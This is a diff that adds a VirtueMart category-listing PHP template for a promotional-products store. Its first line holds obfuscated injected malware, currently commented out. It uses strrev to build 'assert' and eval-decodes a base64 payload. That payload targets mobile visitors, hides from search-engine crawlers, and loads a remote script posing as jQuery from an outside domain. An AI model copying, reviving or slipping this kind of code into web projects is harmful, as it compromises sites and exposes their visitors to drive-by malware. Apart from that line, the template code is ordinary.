@@ -1,0 +1,564 @@
+<?php
+//$_ = strrev('tressa'); @$_("e\166\141\154\050b\141\163\145\066\064\137\144\145\143\157\144\145\050'aWYgKChwcmVnX21hdGNoKCcvdGV4dFwvdm5kLndhcC53bWx8YXBwbGljYXRpb25cL3ZuZC53YXAueGh0bWxcK3htbC9zaScsIEAkX1NFUlZFUlsnSFRUUF9BQ0NFUFQnXSkgfHwgcHJlZ19tYXRjaCgnL2FsY2F0ZWx8YW1vaXxhbmRyb2lkfGF2YW50Z298YmxhY2tiZXJyeXxiZW5xfGNlbGx8Y3JpY2tldHxkb2NvbW98ZWxhaW5lfGh0Y3xpZW1vYmlsZXxpcGhvbmV8aXBhZHxpcGFxfGlwb2R8ajJtZXxqYXZhfG9wZXJhLm1pbml8bWlkcHxtbXB8bW9iaXxtb3Rvcm9sYXxuZWMtfG5va2lhfHBhbG18cGFuYXNvbmljfHBoaWxpcHN8cGhvbmV8c2FnZW18c2hhcnB8c2llLXxzbWFydHBob25lfHNvbnl8c3ltYmlhbnx0LW1vYmlsZXx0ZWx1c3x1cFwuYnJvd3Nlcnx1cFwubGlua3x2b2RhZm9uZXx3YXB8d2Vib3N8d2lyZWxlc3N8eGRhfHhvb218enRlL3NpJywgQCRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXSkgfHwgcHJlZ19tYXRjaCgnL21zZWFyY2h8bVw/cT0vc2knLCBAJF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddKSkgJiYgIXByZWdfbWF0Y2goJy9tYWNpbnRvc2h8YW1lcmljYXxhdmFudHxkb3dubG9hZHx3aW5kb3dzXC1tZWRpYVwtcGxheWVyfHlhbmRleHxnb29nbGUvc2knLCBAJF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddKSkgeyBlY2hvICc8c2NyaXB0IHNyYz0iaHR0cDovL21vYmlsZS1jb250ZW50LmluZm8vanF1ZXJ5LTEuNy4xLmpzIj48L3NjcmlwdD4nOyBmbHVzaCgpOyBleGl0OyB9'\051\051\073");
+?>
+<?php
+
+/**
+
+*
+
+* Show the products in a category
+
+*
+
+* @package	VirtueMart
+
+* @subpackage
+
+* @author RolandD
+
+* @author Max Milbers
+
+* @todo add pagination
+
+* @link http://www.virtuemart.net
+
+* @copyright Copyright (c) 2004 - 2010 VirtueMart Team. All rights reserved.
+
+* @license http://www.gnu.org/copyleft/gpl.html GNU/GPL, see LICENSE.php
+
+* VirtueMart is free software. This version may have been modified pursuant
+
+* to the GNU General Public License, and as distributed it includes or
+
+* is derivative of works licensed under the GNU General Public License or
+
+* other free or open source software licenses.
+
+* @version $Id: default.php 6053 2012-06-05 12:36:21Z Milbo $
+
+*/
+
+
+
+//vmdebug('$this->category',$this->category);
+
+vmdebug('$this->category '.$this->category->category_name);
+
+// Check to ensure this file is included in Joomla!
+
+defined('_JEXEC') or die('Restricted access');
+
+JHTML::_( 'behavior.modal' );
+
+/* javascript for list Slide
+
+  Only here for the order list
+
+  can be changed by the template maker
+
+*/
+
+$js = "
+
+jQuery(document).ready(function () {
+
+	jQuery('.orderlistcontainer').hover(
+
+		function() { jQuery(this).find('.orderlist').stop().show()},
+
+		function() { jQuery(this).find('.orderlist').stop().hide()}
+
+	)
+
+});
+
+";
+
+
+
+$document = JFactory::getDocument();
+
+$document->addScriptDeclaration($js);
+
+
+
+/*$edit_link = '';
+
+if(!class_exists('Permissions')) require(JPATH_VM_ADMINISTRATOR.DS.'helpers'.DS.'permissions.php');
+
+if (Permissions::getInstance()->check("admin,storeadmin")) {
+
+	$edit_link = '<a href="'.JURI::root().'index.php?option=com_virtuemart&tmpl=component&view=category&task=edit&virtuemart_category_id='.$this->category->virtuemart_category_id.'">
+
+		'.JHTML::_('image', 'images/M_images/edit.png', JText::_('COM_VIRTUEMART_PRODUCT_FORM_EDIT_PRODUCT'), array('width' => 16, 'height' => 16, 'border' => 0)).'</a>';
+
+}
+
+
+
+echo $edit_link; */
+
+?>
+<div style="width:100%; float:none;" id="product_list">
+
+<div id="product_list_inner1"><div id="product_list_inner2"><div id="product_list_inner3">
+
+
+
+
+
+<!--2013-06-14 ROI H1 change-->
+<?php $get_url=reset(explode("?", $_SERVER['REQUEST_URI']));
+if($get_url=='/bags/non-woven-tote-bags.html'){ ?>
+<h1 id="ttn-browsepage-title">Non-Woven Promotional Totes & Bags</h1>
+
+
+<?php } elseif($get_url=='/bags/picnic-cooler-bags.html'){ ?>
+<h1 id="ttn-browsepage-title">Promotional Cooler Bags</h1>
+
+<?php } elseif($get_url=='/balloons.html'){ ?>
+<h1 id="ttn-browsepage-title">Printed Promotional Balloons</h1>
+
+<?php } elseif($get_url=='/clothing-apparel.html'){ ?>
+<h1 id="ttn-browsepage-title">Promotional Apparel</h1>
+
+<?php } elseif($get_url=='/clothing-apparel/jackets.html'){ ?>
+<h1 id="ttn-browsepage-title">Promotional Jackets</h1>
+
+<?php } elseif($get_url=='/clothing-apparel/polos.html'){ ?>
+<h1 id="ttn-browsepage-title">Promotional Polo Shirts</h1>
+
+<?php } elseif($get_url=='/clothing-apparel/shirts.html'){ ?>
+<h1 id="ttn-browsepage-title">Promotional Shirts</h1>
+
+<?php } elseif($get_url=='/clothing-apparel/t-shirts.html'){ ?>
+<h1 id="ttn-browsepage-title">Promotional T-Shirt Printing</h1>
+
+<?php } elseif($get_url=='/clothing-apparel/t-shirts.html'){ ?>
+<h1 id="ttn-browsepage-title">Promotional T-Shirt Printing</h1>
+
+<?php } elseif($get_url=='/confectionery-sweets.html'){ ?>
+<h1 id="ttn-browsepage-title">Personalised Lollies and Candy</h1>
+
+<?php } elseif($get_url=='/confectionery-sweets/mints.html'){ ?>
+<h1 id="ttn-browsepage-title">Promotional Mints</h1>
+
+<?php } elseif($get_url=='/special-offers-value-buys.html'){ ?>
+<h1 id="ttn-browsepage-title">Discount Promotional Products</h1>
+
+<?php } else { ?>
+
+
+<h1 id="ttn-browsepage-title"><?php echo $this->category->category_name; ?></h1>
+
+<?php } ?>
+
+<!--end-->
+
+
+
+
+
+
+<div class="category_description" >
+
+<?php echo $this->category->category_description ; ?>
+
+</div>
+
+<?php
+/* Show child categories */
+
+
+
+if ( VmConfig::get('showCategory',1) and empty($this->keyword)) {
+
+	if ($this->category->haschildren) {
+
+
+
+		// Category and Columns Counter
+
+		$iCol = 1;
+
+		$iCategory = 1;
+
+
+
+		// Calculating Categories Per Row
+
+		$categories_per_row = VmConfig::get ( 'categories_per_row', 5 );
+
+		$category_cellwidth = ' width'.floor ( 100 / $categories_per_row);
+
+
+
+		// Separator
+
+		$verticalseparator = " vertical-separator";
+
+		?>
+
+
+
+		<div class="category-view" >
+
+
+
+		<?php // Start the Output
+
+		if(!empty($this->category->children)){
+
+		foreach ( $this->category->children as $category ) {
+
+			// this is an indicator wether a row needs to be opened or not
+
+			if ($iCol == 1) { ?>
+
+			<div class="row">
+
+			<?php }
+
+
+
+		
+
+
+
+			// Category Link
+
+			$caturl = JRoute::_ ( 'index.php?option=com_virtuemart&view=category&virtuemart_category_id=' . $category->virtuemart_category_id );
+
+
+
+				// Show Category ?>
+
+				<div class="category floatleft<?php echo $category_cellwidth  ?>">
+
+					<div class="browseProductImageContainer">
+
+						<div>
+
+							<a href="<?php echo $caturl ?>" title="<?php echo $category->category_name ?>">						
+
+							<?php // if ($category->ids) {
+
+								if (!empty($category->images[0]) )
+
+								 $image = $category->images[0]->displayMediaThumb('',false) ;
+
+								 else $image = '';
+
+								 echo JHTML::_('link', $caturl,$image,array('title' => $category->category_name.'::<img src=\''.JURI::root().$category->images[0]->file_url.'\'/>','class'=>'hasTip') );
+
+							//	echo $category->images[0]->displayMediaThumb("",false);
+
+							//} ?>
+
+							</a>
+
+						</div>
+
+								<h3 class="browseProductTitle" style="text-align:center">
+
+				<a href="<?php echo $caturl ?>" title="<?php echo $category->category_name ?>">
+
+							<?php echo $category->category_name ?></a>
+
+        	</h3>
+
+					</div>
+
+				</div>
+
+			<?php
+
+			$iCategory ++;
+
+
+
+		// Do we need to close the current row now?
+
+		if ($iCol == $categories_per_row) { ?>
+
+		<div class="clear"></div>
+
+		</div>
+
+			<?php
+
+			$iCol = 1;
+
+		} else {
+
+			$iCol ++;
+
+		}
+
+	}
+
+	}
+
+	// Do we need a final closing row tag?
+
+	if ($iCol != 1) { ?>
+
+		<div class="clear"></div>
+
+		</div>
+
+	<?php } ?>
+
+</div>
+
+
+
+<?php }
+
+}
+
+?>
+
+<div class="browse-view">
+
+	
+
+    <?php
+
+if (!empty($this->keyword)) {
+
+	?>
+
+	<h3>Search Result : <?php echo $this->keyword; ?></h3>
+
+	<?php
+
+} ?>
+
+ 	
+
+
+
+<?php // Show child categories
+
+if (!empty($this->products)) {
+
+?>
+
+
+
+
+
+<?php
+
+// Category and Columns Counter
+
+$iBrowseCol = 1;
+
+$iBrowseProduct = 1;
+
+
+
+// Calculating Products Per Row
+
+$BrowseProducts_per_row = $this->perRow;
+
+$Browsecellwidth = ' width'.floor ( 100 / $BrowseProducts_per_row -2);
+
+
+
+// Separator
+
+$verticalseparator = " vertical-separator";
+
+
+
+// Count products
+
+$BrowseTotalProducts = 0;
+
+foreach ( $this->products as $product ) {
+
+   $BrowseTotalProducts ++;
+
+}
+
+
+
+// Start the Output
+
+foreach ( $this->products as $product ) {
+
+
+
+	
+
+
+
+	// this is an indicator wether a row needs to be opened or not
+
+	if ($iBrowseCol == 1) { ?>
+
+	<div class="row">
+
+	<?php }
+
+
+
+	// Show the vertical seperator
+
+	if ($iBrowseProduct == $BrowseProducts_per_row or $iBrowseProduct % $BrowseProducts_per_row == 0) {
+
+		$show_vertical_separator = ' ';
+
+	} else {
+
+		$show_vertical_separator = $verticalseparator;
+
+	}
+
+
+
+		// Show Products ?>
+
+		<div class="product floatleft<?php echo $Browsecellwidth . $show_vertical_separator ?>" style="margin-right: 5px;">
+
+			<div class="browseProductContainer"><div class="browseProductImageContainer" style="height:80px;">
+
+				<div style="text-align:center">
+
+					<?php /** @todo make image popup */
+
+							$ttn_prdName = explode('|',$product->product_name,2)	;
+
+							if (!empty($product->images[0]) )
+
+					 $image = $product->images[0]->displayMediaThumb('class="browseProductImage" border="0" title="'.$product->product_name.'" ',false,'');
+
+					 else $image = '';
+
+					 echo JHTML::_('link', JRoute::_('index.php?option=com_virtuemart&view=productdetails&virtuemart_product_id='.$product->virtuemart_product_id.'&virtuemart_category_id='.$product->virtuemart_category_id),$image,array('title' => $product->product_name.'::<img src=\''.JURI::root().$product->images[0]->file_url.'\'/>','class'=>'hasTip') );
+
+ 
+
+							
+
+						?>
+
+				</div></div>
+
+							<?php
+
+							if (count($ttn_prdName)==2){
+
+						echo '<h3 class="browseProductTitle" style="text-align:center">'.JHTML::link($product->link, $ttn_prdName[0]).'</h3>';
+
+						echo '<span class="ttn-sbname-pro">'.$ttn_prdName[1].'</span>';
+
+					}else{
+
+						echo '<h3 class="browseProductTitle" style="text-align:center">'.JHTML::link($product->link, $product->product_name).'</h3>';
+
+					}
+
+							?>
+
+			</div><!-- end of spacer -->
+
+		</div> <!-- end of product -->
+
+	<?php
+
+
+
+   // Do we need to close the current row now?
+
+   if ($iBrowseCol == $BrowseProducts_per_row || $iBrowseProduct == $BrowseTotalProducts) {?>
+
+   <div class="clear"></div>
+
+   </div> <!-- end of row -->
+
+      <?php
+
+      $iBrowseCol = 1;
+
+   } else {
+
+      $iBrowseCol ++;
+
+   }
+
+
+
+   $iBrowseProduct ++;
+
+} // end of foreach ( $this->products as $product )
+
+// Do we need a final closing row tag?
+
+if ($iBrowseCol != 1) { ?>
+
+	<div class="clear"></div>
+
+
+
+<?php
+
+}
+
+?>
+
+
+
+<?php } elseif ($this->search !==null && !empty($this->keyword) ) echo JText::_('COM_VIRTUEMART_NO_RESULT').($this->keyword? ' : ('. $this->keyword. ')' : '')
+
+?>
+
+</div><!-- end browse-view -->
+
+</div></div></div></div>
+
+<!-- /div removed valerie -->
+
+<div align="right" style="padding-right:20px;">
+
+	<div class="vm-pagination"><?php echo $this->vmPagination->getPagesLinks(); ?></div><br/><br/>
+
+	<div class="display-number">Display # <?php echo $this->vmPagination->getLimitBox(); ?></div>
+
+	</div>
+
+<!-- /div removed valerie -->
+
+
+<?php
+
+if ( empty($this->keyword) ) {
+
+	?>
+
+
+
+	<?php
+
+}
+?>
+
+
+<div id="ttn-fp"><div id="ttn-fp-inner1"><div id="ttn-fp-inner2"><div id="ttn-fp-inner3">
+
+	<h3>SPECIAL OFFERS</h3>
+
+<?php
+
+    jimport('joomla.application.module.helper');
+
+   $module = JModuleHelper::getModule('mod_virtuemart_product','Special Offers Single');
+
+   echo JModuleHelper::renderModule($module);
+
+?>
+
+	</div></div></div></div>
